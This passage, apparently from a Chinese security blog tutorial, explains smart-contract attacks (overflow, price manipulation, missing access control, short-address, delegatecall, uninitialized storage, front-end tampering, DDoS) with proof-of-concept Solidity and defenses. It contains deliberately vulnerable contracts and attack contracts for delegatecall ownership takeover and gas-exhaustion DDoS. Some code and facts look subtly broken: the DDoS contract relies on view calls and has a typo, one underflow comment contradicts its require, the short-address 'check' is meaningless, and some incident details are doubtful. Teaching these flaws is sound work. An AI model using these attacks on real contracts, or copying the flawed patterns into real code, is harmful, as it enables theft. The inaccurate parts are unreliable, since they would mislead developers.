1;</span><br><span class="line">     // 同时给部署者地址分配对应余额（模拟“已发行”）</span><br><span class="line">     balances[msg.sender] = totalSupply;</span><br><span class="line">  &#125; </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    //铸造代币</span><br><span class="line">    function mint(address to, uint256 amount) public &#123;</span><br><span class="line">        totalSupply += amount; // 若totalSupply + amount超过uint256最大值，会溢出为0</span><br><span class="line">        balances[to] += amount; // 同理，用户余额也可能溢出</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">    function transfer(address to, uint256 amount) public &#123;</span><br><span class="line">        require(balances[msg.sender] &gt;= amount, &quot;Insufficient balance&quot;);</span><br><span class="line">        balances[msg.sender] -= amount; // 若balances[msg.sender] &lt; amount，会下溢（如0-1变成极大值）</span><br><span class="line">        balances[to] += amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="如何防御？"><a href="#如何防御？" class="headerlink" title="如何防御？"></a>如何防御？</h3><ol>
<li>尽量用 Solidity 0.8.0 以上版本（自动防护）：0.7.0 版本不会检查溢出，所以会成功溢出，而 0.8.0 以上版本会直接报错。</li>
<li>用<code>SafeMath</code>库或手动加检查（针对旧版本）。</li>
</ol>
<h2 id="3-价格操纵攻击"><a href="#3-价格操纵攻击" class="headerlink" title="3.价格操纵攻击"></a>3.价格操纵攻击</h2><h3 id="概述-2"><a href="#概述-2" class="headerlink" title="概述"></a>概述</h3><p>价格操纵攻击是指攻击者通过不正当手段人为影响加密货币（或代币）的市场价格，进而利用价格波动获利的行为。<br>在区块链和智能合约场景中，这种攻击尤其容易发生在去中心化金融（DeFi）平台（如去中心化交易所、借贷平台等），因为这些平台的价格往往依赖于链上数据或自动做市机制，存在可被利用的漏洞。<br>核心原因是<strong>链上价格的 “可篡改性”</strong>。传统金融市场的价格由大量参与者和监管机制共同决定，操纵难度大；但 DeFi 平台的价格往往依赖于 “即时交易数据” 或 “特定资金池的供需关系”，攻击者可以通过大额交易、闪电贷等工具短期扭曲价格，实现操纵。</p>
<h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><ol>
<li>闪电贷操纵<br>攻击者利用 “闪电贷”（<strong>无需抵押，能瞬间借入巨额资金，只要在同一笔交易内归还即可</strong>）的特性，快速完成 “借钱→操纵价格→获利→还钱” 的闭环。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 攻击者从闪电贷平台借出1万个ETH（无需抵押，只要最后还回去）；</span><br><span class="line">2. 用这1万个ETH 在某个小资金池大量买入B代币，导致B代币价格瞬间飙升（比如从1ETH涨到10ETH）；</span><br><span class="line">3. 此时，攻击者去另一个依赖该资金池价格的平台（比如借贷平台），用“被高估的B代币”作为抵押，借出大量其他资产（如USDC）；</span><br><span class="line">4. 抛售之前买入的B代币，价格跌回正常水平（1ETH），归还闪电贷的1万个ETH（支付少量手续费）；</span><br><span class="line">5. 最终，攻击者凭空套走了借贷平台的USDC，而借贷平台手里只剩下“价格暴跌的B代币”。</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>三明治攻击<br>攻击者监控链上待确认的大额交易，通过 “抢先交易” 在用户交易前后操作，赚取差价。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 小明要在DEX上用100ETH买入C代币（这笔交易还没上链，在内存池中）；</span><br><span class="line">2. 攻击者发现后，立刻用更高的gas费抢先买入C代币（此时C代币价格开始上涨）；</span><br><span class="line">3. 小明的交易被确认，由于买入量大会进一步推高C代币价格；</span><br><span class="line">4. 攻击者在小明交易完成后，立刻卖出之前买入的C代币，高价套现，赚取差价；</span><br><span class="line">5. 最终，小明以更高的价格买到了C代币（亏了），攻击者赚了差价。</span><br></pre></td></tr></table></figure>
<p><strong>关键点</strong>：利用区块链 “交易顺序可被 gas 费影响” 的特点，在用户交易前后 “低买高卖”。</p>
<ol start="3">
<li>虚假交易量操纵<br>攻击者通过 “自买自卖” 制造虚假的交易活跃度，吸引其他用户入场，再高位抛售。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">攻击者用两个自己控制的地址，反复买卖D代币（比如地址A卖给地址B，再用更高价格买回来，循环几十次）。平台的交易量排行榜会显示D代币 “交易火爆”，吸引真实用户跟风买入。当价格被推到高位后，攻击者卖出所有D代币，导致价格崩盘，其他用户被套。</span><br></pre></td></tr></table></figure>
<h3 id="如何防御？-1"><a href="#如何防御？-1" class="headerlink" title="如何防御？"></a>如何防御？</h3><ol>
<li><strong>增加资金池流动性</strong>：流动性越高，操纵价格需要的资金量越大，攻击成本越高。</li>
<li><strong>使用时间加权平均价格</strong>：不依赖 “即时价格”，而是取一段时间（如 1 小时）的平均价格，降低短期操纵的影响；</li>
<li><strong>监控异常交易</strong>：通过链上数据分析，识别 “自买自卖”“大额异常交易” 等行为，及时预警。</li>
<li><strong>限制单笔交易规模</strong>：比如 DEX 中，单笔交易不能超过资金池总量的 5%，避免大额交易扭曲价格。</li>
</ol>
<h2 id="4-权限控制漏洞攻击"><a href="#4-权限控制漏洞攻击" class="headerlink" title="4.权限控制漏洞攻击"></a>4.权限控制漏洞攻击</h2><h3 id="概述-3"><a href="#概述-3" class="headerlink" title="概述"></a>概述</h3><p>权限控制漏洞是指智能合约在权限管理方面存在缺陷，使得未授权的用户能够执行本应只有特定权限用户才能执行的操作。<br>例如，合约的关键函数（如修改参数、提取资金等）未设置严格的权限检查，攻击者通过调用这些函数，可非法获取合约控制权或转移合约资产。</p>
<h3 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h3><p>存在权限控制漏洞的合约实例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">	contract PermissionVulnerable &#123;</span><br><span class="line">	address public owner;</span><br><span class="line">	mapping(address =&gt; uint256) public funds;</span><br><span class="line"></span><br><span class="line">	constructor() &#123;</span><br><span class="line">		owner = msg.sender;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// 未进行权限检查，任何人都可调用</span><br><span class="line"></span><br><span class="line">	function withdrawFunds(address to, uint256 amount) public &#123;</span><br><span class="line">		require(funds[to] &gt;= amount, &quot;Insufficient funds&quot;);</span><br><span class="line">		funds[to] -= amount;</span><br><span class="line">		payable(to).transfer(amount);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>攻击示例：攻击者调用<code>withdrawFunds</code> 函数，将其他用户在合约中的资金转移到自己账户。</p>
<ol>
<li><p>漏洞原理：权限控制漏洞源于合约未对关键操作设置有效的权限验证机制，导致未授权用户可越权执行敏感操作。这可能是由于开发者疏忽，未添加权限检查修饰符，或权限设计逻辑存在缺陷。​</p>
</li>
<li><p>防范措施：使用修饰符（如 <code>onlyOwner</code>）对关键函数进行权限控制，明确规定只有特定地址（如合约所有者、管理员）才能调用。同时，采用最小权限原则，仅为必要的地址分配相应权限，并定期审查权限设置。​</p>
</li>
<li><p>事件影响：权限控制漏洞可能导致合约资产被非法转移、合约参数被恶意修改等严重后果，给项目和用户带来巨大的经济损失，严重影响项目的正常运营。</p>
</li>
</ol>
<h2 id="5-短地址攻击"><a href="#5-短地址攻击" class="headerlink" title="5.短地址攻击"></a>5.短地址攻击</h2><h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>在以太坊中，当地址长度不足 20 字节时，合约自动补零地址长度为 20 字节，当攻击者提供一个短于 20 字节的地址时，&#x3D;&#x3D;某些合约会自动在地址末尾补零以达到 20 字节长度&#x3D;&#x3D;。攻击者利用这一特性，构造特定的短地址，使得合约在计算转账金额时出现错误，从而获取额外的代币。</p>
<h3 id="POC-3"><a href="#POC-3" class="headerlink" title="POC"></a>POC</h3><p>存在短地址漏洞的代币转账合约的示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract ShortAddressVulnerable &#123;</span><br><span class="line">	mapping(address =&gt; uint256) public balanceOf;</span><br><span class="line"></span><br><span class="line">	function transfer(address to, uint256 amount) public &#123;</span><br><span class="line">		require(balanceOf[msg.sender] &gt;= amount, &quot;Insufficient balance&quot;);</span><br><span class="line">		balanceOf[msg.sender] -= amount;</span><br><span class="line">		balanceOf[to] += amount;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>攻击示例：攻击者使用一个19字节的地址调用<code>transfer</code> 函数，合约会自动补一个零字节使地址变为20字节。此时，在解析输入数据时，金额的低位字节会被错误地解析，导致实际转账金额远大于预期，攻击者从而获得更多代币。</p>
<h3 id="如何预防？"><a href="#如何预防？" class="headerlink" title="如何预防？"></a>如何预防？</h3><p>随着短地址攻击事件的曝光和安全意识的提升，主流的开发实践中已经普遍加入了地址长度验证逻辑。例如：</p>
<ol>
<li>许多项目会使用<code>require(bytes.length == 20, &quot;Invalid address length&quot;)</code>这样的显式检查，直接验证输入地址的字节长度是否为 20 字节。</li>
<li>一些开发框架（如 OpenZeppelin）提供的标准合约模板中，也内置了对地址有效性的校验，间接规避了短地址风险。</li>
</ol>
<h2 id="6-委托调用-delegatecall"><a href="#6-委托调用-delegatecall" class="headerlink" title="6.委托调用(delegatecall)"></a>6.委托调用(delegatecall)</h2><p><code>delegatecall</code>是指 “借代码执行”，假设合约A调用合约B的<code>delegatecall</code>，就相当于合约A”借用” 了合约B的代码，些代码会在合约A自己的 “地盘”（存储数据区域）上执行，执行过程中修改的是合约A的数据，而不是合约B的数据。</p>
<h3 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>委托调用（delegatecall）是 Solidity 中一种特殊的函数调用方式，允许合约&#x3D;&#x3D;在自己的存储上下文中执行另一个合约的代码&#x3D;&#x3D;。当被调用合约的存储布局与调用者不匹配时，可能导致状态变量被意外修改。若被调用合约不可信，攻击者可构造代码篡改调用者的关键状态。历史上多个项目因滥用<code>delegatecall</code> 导致合约被攻击，资产被转移。</p>
<h3 id="POC-4"><a href="#POC-4" class="headerlink" title="POC"></a>POC</h3><p>存在漏洞的委托调用合约：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract VulnerableDelegate &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint256 public balance;</span><br><span class="line"></span><br><span class="line">    function execute(address _target, bytes calldata _data) external &#123;</span><br><span class="line">        // 未验证_target的安全性，直接执行委托调用</span><br><span class="line">        (bool success, ) = _target.delegatecall(_data);</span><br><span class="line">        require(success, &quot;Delegatecall failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit() external payable &#123;</span><br><span class="line">        balance += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">// 攻击合约</span><br><span class="line">contract MaliciousContract &#123;</span><br><span class="line">    address public owner; // 与VulnerableDelegate的存储布局匹配</span><br><span class="line">  </span><br><span class="line">    function attack() external &#123;</span><br><span class="line">        owner = msg.sender; // 修改调用者合约的owner</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>攻击流程：</p>
<ol>
<li>攻击者部署<code>MaliciousContract</code>。</li>
<li>调用<code>VulnerableDelegate.execute()</code>，传入攻击合约地址和<code>attack()</code>函数的 calldata。</li>
<li>委托调用执行后，<code>VulnerableDelegate</code>的 owner 被修改为攻击者地址。</li>
</ol>
<h3 id="如何预防？-1"><a href="#如何预防？-1" class="headerlink" title="如何预防？"></a>如何预防？</h3><p>避免对不可信合约使用<code>delegatecall</code>，严格验证被调用合约的地址和权限,确保被调用合约的存储布局与调用者完全匹配。</p>
<h2 id="7-未初始化存储指针漏洞"><a href="#7-未初始化存储指针漏洞" class="headerlink" title="7.未初始化存储指针漏洞"></a>7.未初始化存储指针漏洞</h2><h3 id="漏洞原理-3"><a href="#漏洞原理-3" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Solidity 中存储指针（storage）未初始化时默认指向存储位置 0，对其赋值会直接修改对应存储槽的数据。若该存储位置已被其他关键变量占用，就会造成状态混乱。</p>
<h3 id="POC-5"><a href="#POC-5" class="headerlink" title="POC"></a>POC</h3><p>存在未初始化存储指针的合约：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0; </span><br><span class="line"></span><br><span class="line">contract UninitializedStorage &#123;</span><br><span class="line">    struct User &#123;</span><br><span class="line">        address addr;</span><br><span class="line">        uint256 balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    User public owner; // 存储位置0: owner.addr, 存储位置1: owner.balance</span><br><span class="line">    uint256 public totalSupply; // 存储位置2</span><br><span class="line"></span><br><span class="line">    function initUser() external &#123;</span><br><span class="line">        User storage user; // 未初始化的存储指针，默认指向位置0</span><br><span class="line">        user.addr = msg.sender; // 实际修改了owner.addr</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该漏洞影响：调用<code>initUser()</code>后，本应初始化新用户的操作，实际修改了<code>owner.addr</code>的值，导致合约所有者被篡改。</p>
<p>正确的声明方式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract FixedUninitializedStorage &#123;</span><br><span class="line">    struct User &#123;</span><br><span class="line">        address addr;</span><br><span class="line">        uint256 balance;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    User public owner; // 存储位置0: owner.addr, 存储位置1: owner.balance</span><br><span class="line">    uint256 public totalSupply; // 存储位置2</span><br><span class="line">    User[] public users; // 新增一个数组存储用户，作为示例</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    // 方法1: 使用memory创建临时变量（不会修改存储）</span><br><span class="line">    function initUserMemory() external &#123;</span><br><span class="line">        User memory user; // 声明为memory，在内存中创建临时变量</span><br><span class="line">        user.addr = msg.sender;</span><br><span class="line">        // 如需保存到存储，需显式赋值</span><br><span class="line">        // users.push(user);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 方法2: 显式初始化存储指针（指定存储位置）</span><br><span class="line">    function initUserStorage() external &#123;</span><br><span class="line">        User storage user = users.push(); // 明确指向数组中的新元素</span><br><span class="line">        user.addr = msg.sender; // 正确修改新用户的addr，不会影响owner</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 方法3: 直接初始化状态变量</span><br><span class="line">    function initOwner() external &#123;</span><br><span class="line">        owner.addr = msg.sender; // 直接操作已定义的存储变量</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="如何预防？-2"><a href="#如何预防？-2" class="headerlink" title="如何预防？"></a>如何预防？</h3><p>初始化所有存储指针变量，明确指定存储位置；避免在复杂结构体中使用未初始化的存储引用；使用<code>memory</code>关键字声明临时变量，避免意外修改存储。<br>注意：审计时需搜索所有<code>storage</code>关键字的使用，确认是否存在未初始化的存储指针，特别注意结构体和映射类型的存储变量。</p>
<h2 id="8-前端代码篡改攻击。"><a href="#8-前端代码篡改攻击。" class="headerlink" title="8.前端代码篡改攻击。"></a>8.前端代码篡改攻击。</h2><h3 id="传统"><a href="#传统" class="headerlink" title="传统"></a>传统</h3><h4 id="攻击原理-1"><a href="#攻击原理-1" class="headerlink" title="攻击原理"></a>攻击原理</h4><p>攻击者通过各种手段，如入侵网站服务器、利用软件漏洞等，篡改网站的前端代码。例如，修改网页上的表单提交地址，将用户输入的敏感信息（如用户名、密码、银行卡号等）发送到攻击者指定的服务器；或者篡改网页上的链接，使用户点击后跳转到钓鱼网站，从而骗取用户的信任和信息。</p>
<h4 id="攻击特点"><a href="#攻击特点" class="headerlink" title="攻击特点"></a>攻击特点</h4><ul>
<li><strong>隐蔽性强</strong>：攻击者篡改的是前端代码，用户在浏览网页时很难直接察觉页面内容已被篡改，只有在信息被盗取或出现异常操作后才可能发现。</li>
<li><strong>攻击范围广</strong>：一旦前端代码被篡改，所有访问该网站的用户都可能受到影响，尤其是一些大型知名网站，影响范围可能涉及大量用户。</li>
</ul>
<h3 id="区块链"><a href="#区块链" class="headerlink" title="区块链"></a>区块链</h3><h4 id="攻击原理-2"><a href="#攻击原理-2" class="headerlink" title="攻击原理"></a>攻击原理</h4><p>在区块链场景中，前端代码篡改攻击主要针对加密货币交易所等平台。黑客通过入侵交易所的前端服务器或利用相关工具的漏洞，篡改前端代码，从而绕过多重签名等安全机制，实现对用户资产的窃取。</p>
<h4 id="典型案例-2"><a href="#典型案例-2" class="headerlink" title="典型案例"></a>典型案例</h4><ul>
<li><strong>2025 年 Bybit 交易所前端代码篡改攻击</strong>：2025 年 2 月 21 日，加密货币交易所 Bybit 遭遇了一起严重的前端代码篡改攻击。黑客于 2 月 19 日预先部署恶意合约，可能通过社会工程学手段入侵了 Bybit 内部人员的设备。2 月 21 日，Bybit 在进行常规的冷钱包至热钱包资金转移时，黑客篡改了授权者所见的交易界面，尽管浏览器显示的 URL 和地址看似合法，但实际底层代码已被替换为恶意逻辑。Bybit 的 CEO 作为最终签名者，确认了网站无误，但未察觉交易已被 “掩码交易” 技术篡改，导致签名实际授权的是向黑客地址的转账。随后，价值约 15 亿美元的资产被转至黑客控制的地址，并被迅速分散和兑换。</li>
</ul>
<h4 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h4><ul>
<li><strong>代码植入</strong>：黑客将恶意 JavaScript 代码注入 app.safe.global 的静态资源中，该代码被设计为仅在特定条件下触发，例如当交易发起者为 Bybit 的多重签名地址时。</li>
<li><strong>用户界面欺骗</strong>：当 Bybit 的签名者通过 Safe Wallet 的网页界面签署交易时，恶意代码悄然替换了交易参数。签名者看到的 UI 显示的是正常的目标地址，如热钱包地址，但实际签名的数据却是黑客指定的恶意地址。</li>
<li><strong>交易执行</strong>：一旦签名者完成签名，篡改后的交易数据被提交至以太坊区块链。由于多重签名机制依赖于前端生成的签名，而非链上验证交易内容，黑客成功绕过了后端防护，完成了资金转移。</li>
</ul>
<h4 id="如何防御？-2"><a href="#如何防御？-2" class="headerlink" title="如何防御？"></a>如何防御？</h4><ul>
<li><strong>加强前端代码安全</strong>：对前端代码进行严格的安全审计和测试，确保代码没有漏洞。采用安全的前端框架和库，并及时更新版本，修复已知的安全问题。</li>
<li><strong>增加完整性校验</strong>：在前端对加载的 JavaScript 文件等资源进行完整性验证。</li>
<li><strong>多重签名机制优化</strong>：不仅要依赖前端的签名验证，还要在链上进行更严格的交易内容验证，确保交易的目标地址等关键信息符合预期。</li>
</ul>
<h2 id="9-DDoS-攻击"><a href="#9-DDoS-攻击" class="headerlink" title="9.DDoS 攻击"></a>9.DDoS 攻击</h2><p>DDoS（Distributed Denial of Service），分布式拒绝服务，是一种网络攻击方式。</p>
<h3 id="传统-1"><a href="#传统-1" class="headerlink" title="传统"></a>传统</h3><h4 id="攻击原理-3"><a href="#攻击原理-3" class="headerlink" title="攻击原理"></a>攻击原理</h4><p>攻击者先控制多台计算机或路由器，这些被控制的设备称为 “肉机” 或 “傀儡机”。然后，利用这些肉机<strong>向目标服务器发送大量请求，耗尽服务器的资源，使其无法响应合法请求</strong>。DDoS 攻击一般由攻击者、主控端和代理端三部分组成。攻击者是指挥者，向主控端发送攻击命令；主控端控制着大量代理主机，接受攻击者指令并转发给代理端；代理端运行攻击程序，直接向受害者主机发送攻击。</p>
<h4 id="攻击特点-1"><a href="#攻击特点-1" class="headerlink" title="攻击特点"></a>攻击特点</h4><p>分布式的攻击主体：攻击主体不集中在一个地点，而是分布在不同地区、国家甚至全球各个角落。<br>隐蔽性的攻击方式：傀儡机不直接与攻击者的主机交互，而是通过控制傀儡机和主控端之间的连接来发起攻击，使得攻击者更难被追踪和识别。</p>
<h3 id="区块链-1"><a href="#区块链-1" class="headerlink" title="区块链"></a>区块链</h3><h4 id="攻击原理-4"><a href="#攻击原理-4" class="headerlink" title="攻击原理"></a>攻击原理</h4><p>区块链与智能合约场景下的 DDoS攻击，核心是通过<strong>消耗目标网络 &#x2F; 合约的关键资源</strong>（如区块 Gas 上限、合约执行步数、节点带宽 &#x2F; 算力），导致目标无法正常处理合法请求。与传统互联网 DDoS（消耗带宽）不同，区块链 DDoS 更聚焦于 “链上资源瓶颈”。<br>对<strong>公链网络</strong>：利用大量低 Gas 消耗的垃圾交易占据区块空间，导致合法交易（如转账、合约调用）因区块满而无法确认，或确认延迟大幅增加；<br>对<strong>智能合约</strong>：构造能触发 “高计算复杂度” 的调用（如无限循环、多层嵌套计算），耗尽合约单次调用的 Gas 限制，或导致节点在处理该合约时过载，间接影响整个链的交易处理效率。</p>
<h4 id="典型案例-3"><a href="#典型案例-3" class="headerlink" title="典型案例"></a>典型案例</h4><ol>
<li><strong>2018 年以太坊 DDoS 攻击</strong><br> 攻击者利用以太坊上 “简单转账合约” 的低 Gas 特性，批量发起数百万笔小额转账交易（每笔 Gas 消耗仅 21000，远低于复杂合约调用），填满以太坊区块的 Gas 上限。<em><strong>导致大量合法交易（如 DeFi 合约交互、大额转账）被阻塞</strong></em>，平均确认时间从 15 秒飙升至数小时，部分交易所因无法及时处理提币请求暂停服务，以太坊网络 TPS（每秒交易数）接近瘫痪。</li>
<li><strong>2022 年 Polygon 链合约 DDoS 攻击</strong><br> 攻击者针对 Polygon 链上一个热门 NFT 市场合约，构造 “恶意查询请求”：调用合约中 “遍历全量 NFT 持有者列表” 的函数（该函数需循环读取数百个地址数据，Gas 消耗极高），并通过数百个傀儡账户高频重复调用。单个请求的 Gas 消耗接近 Polygon 区块的单块 Gas 上限，<em><strong>导致区块被该恶意请求独占</strong></em>，其他合约调用、转账交易全部无法确认，该 NFT 市场及依赖 Polygon 的部分 DeFi 项目停摆近 2 小时。</li>
</ol>
<h4 id="POC-6"><a href="#POC-6" class="headerlink" title="POC"></a>POC</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract VulnerableNFTMarket&#123;</span><br><span class="line">    address[] public allHolders;//所有NFT持有者（假设数量极大，如10000个）</span><br><span class="line">    mpping(address=&gt;uint256)public holderBalance;</span><br><span class="line">  </span><br><span class="line">    function calculateTotalBalance() public view returns (uint256 total) &#123;</span><br><span class="line">        for (uint256 i = 0; i &lt; allHolders.length; i++) &#123;//// 若allHolders数量为10000，循环10000次，Gas消耗远超普通函数</span><br><span class="line">            total += holderBalance[allHolders[i]];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">contract DDosHack&#123;</span><br><span class="line">    VulnerableNFTMarket public targetMarket;</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    constructor(address _targetMarket) &#123;</span><br><span class="line">        targetMarket = VulnerableNFTMarket(_targetMarket);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     // 单次攻击调用：触发目标合约的高Gas函数</span><br><span class="line">    function singleAttack() external view &#123;</span><br><span class="line">        // 调用目标的高计算函数，消耗大量Gas</span><br><span class="line">        targetMarket.calculateTotalBalance();</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    // 批量攻击：通过循环多次调用（实际攻击中会用多账户并发调用）</span><br><span class="line">    function batchAttack(uint256 attackTimes) external view &#123;</span><br><span class="line">        for (uint256 i = 0; i &lt; attackTimes; i++) &#123;</span><br><span class="line">            targetMarket.calculateTotalBalance();</span><br><span class="line">            // 若attackTimes设为100，单次调用Gas消耗将达到普通交易的100倍以上</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>攻击流程</strong>：</p>
<ol>
<li>攻击者部署<code>DDoSAttackContract</code>，传入目标合约<code>VulnerableNFTMarket</code>地址；</li>
<li>利用 100 个傀儡账户，每个账户携带足够 Gas，高频调用<code>batchAttack(100)</code>函数；</li>
<li>目标合约的<code>calculateTotalBalance()</code>函数被反复调用，单次调用 Gas 消耗占满 Polygon 区块的 Gas 上限（约 3000 万 Gas）；</li>
<li>区块被恶意请求独占，合法用户的 “NFT 购买”“转账” 等请求因 Gas 不足无法打包，目标市场陷入瘫痪。</li>
</ol>
<h4 id="如何防御？-3"><a href="#如何防御？-3" class="headerlink" title="如何防御？"></a>如何防御？</h4><p>区块链与智能合约场景的 DDoS 防御需结合 “链上限制”“合约优化”“网络监控” 三重手段，核心是 “减少资源消耗漏洞” 和 “提高攻击成本”。</p>
<p> 合约：避免无限&#x2F;高次循环。<br> 链&#x2F;平台：提高区块gas上限，过滤恶意请求。<br> 监控与应急层面：实时链上检测。</p>
<blockquote>
<p>区块链 DDoS 攻击的防御难度高于传统互联网，因去中心化网络无法通过 “关闭某个节点” 阻断攻击。目前行业更依赖 “资源扩容 + 智能合约优化 + 实时监控” 的组合策略，降低攻击成功率和影响范围。</p>
</blockquote>
